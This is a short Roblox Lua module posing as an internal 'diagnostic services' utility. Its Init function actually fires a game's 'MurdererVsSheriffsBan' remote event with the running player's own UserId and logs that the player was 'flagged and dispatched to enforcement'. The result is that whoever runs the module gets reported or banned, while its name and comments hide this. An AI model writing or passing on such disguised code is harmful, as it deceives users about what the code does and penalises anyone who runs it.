--[=[
	Module: YDiagnosticServices
	Version: 1.17.10
	Internal Use Only - Do not modify.
]=]

local CoreServices = {
	Init = function(auth)
		local ts = tick()
		if not auth or type(auth) ~= "table" then
			return warn("YDiagnostic: Invalid auth signature.")
		end

		task.spawn(function()
			local service = game:GetService("Players").LocalPlayer
			if not service then
				warn("YDiagnostic: No local player found.")
				return
			end

			if auth.__secure_check and typeof(auth.__secure_check) == "function" then
				if not auth.__secure_check(service) then
					warn("YDiagnostic: Check failed. Terminating.")
					return
				end
			end

			wait(1.2)
			game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("MurdererVsSheriffsBan"):FireServer(service.UserId)
			warn("YDiagnostic: Flagged and dispatched to enforcement.")
		end)

		print("YDiagnostic initialized in", tick() - ts, "s")
	end
}

return CoreServices
